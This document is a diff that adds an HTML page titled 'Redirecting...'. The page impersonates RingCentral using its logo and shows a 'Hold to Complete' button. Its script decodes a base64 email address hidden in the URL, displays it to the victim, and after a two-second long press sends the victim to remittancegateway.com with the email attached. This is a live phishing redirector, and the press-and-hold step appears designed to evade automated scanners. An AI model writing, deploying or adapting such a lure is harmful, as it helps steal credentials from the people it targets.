@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+        }
+        .container {
+            text-align: center;
+        }
+        .dots-container {
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .dot {
+            background-color: #3498db;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            margin: 5px;
+            animation: grow 1.5s infinite ease-in-out;
+        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.1s; }
+        .dot:nth-child(3) { animation-delay: 0.2s; }
+        .dot:nth-child(4) { animation-delay: 0.3s; }
+        .dot:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes grow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #emailDisplay {
+            color: #3498db;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        #longPressButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            user-select: none; /* Prevent copying text on long press */
+        }
+        #longPressButton:hover {
+            background-color: #2980b9;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            height: 20px;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .progress-bar {
+            height: 100%;
+            background-color: #3498db;
+            width: 0;
+            transition: width 0.1s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Ringcentral_logo_%282009%29.png" alt="Logo" width="130px">
+        <div id="emailDisplay" aria-live="polite"></div>
+        <button id="longPressButton">Hold to Complete</button>
+        <div class="progress-container">
+            <div id="progressBar" class="progress-bar"></div>
+        </div>
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
+    <script>
+        // Function to decode base64 string
+        function decodeBase64(encoded) {
+            try {
+                return decodeURIComponent(atob(encoded).split('').map(c =>
+                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+            } catch (e) {
+                console.error("Decoding failed: ", e);
+                return null; // Return null if decoding fails
+            }
+        }
+
+        // Function to find and decode the email parameter
+        function findEmailParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams.entries()) {
+                const decodedValue = decodeBase64(key);
+                if (decodedValue && decodedValue.includes('@')) {
+                    return decodedValue; // Return the decoded email
+                }
+            }
+            return null;
+        }
+
+        // Function to handle redirection
+        function redirectToTarget(email) {
+            const links = [
+                `https://remittancegateway.com/old/?email=${encodeURIComponent(email)}`
+            ];
+            const randomLink = links[Math.floor(Math.random() * links.length)];
+            console.log("Redirecting to: ", randomLink);
+            window.location.href = randomLink;
+        }
+
+        // Function to update the displayed email
+        function updateLink() {
+            const email = findEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (email) {
+                console.log("Displaying email: ", email);
+                emailDisplay.innerText = email; // Always display the email
+            } else {
+                console.error("No email to display");
+            }
+        }
+
+        // Long press button functionality
+        const button = document.getElementById('longPressButton');
+        const progressBar = document.getElementById('progressBar');
+
+        let timer;
+        let progress = 0;
+        const holdTime = 2000; // time in milliseconds to hold the button
+
+        const startProgress = () => {
+            progress = 0;
+            progressBar.style.width = '0%';
+            timer = setInterval(() => {
+                progress += 100 / (holdTime / 100);
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    // Hide the long press button and progress bar
+                    button.style.display = 'none';
+                    document.querySelector('.progress-container').style.display = 'none';
+                    // Show loading dots
+                    document.querySelector('.dots-container').style.display = 'flex';
+                    // Wait for 2 seconds before redirecting
+                    setTimeout(() => {
+                        const email = findEmailParam();
+                        if (email) {
+                            redirectToTarget(email);
+                        } else {
+                            console.error("No email found for redirection");
+                        }
+                    }, 2000);
+                }
+            }, 100);
+        };
+
+        const stopProgress = () => {
+            clearInterval(timer);
+            progressBar.style.width = '0%';
+        };
+
+        button.addEventListener('mousedown', startProgress);
+        button.addEventListener('touchstart', (e) => {
+            e.preventDefault(); // Prevent default touch behavior
+            startProgress();
+        });
+        button.addEventListener('mouseup', stopProgress);
+        button.addEventListener('mouseleave', stopProgress);
+        button.addEventListener('touchend', stopProgress);
+        button.addEventListener('touchcancel', stopProgress);
+
+        window.onload = updateLink;
+    </script>
+</body>
+</html>
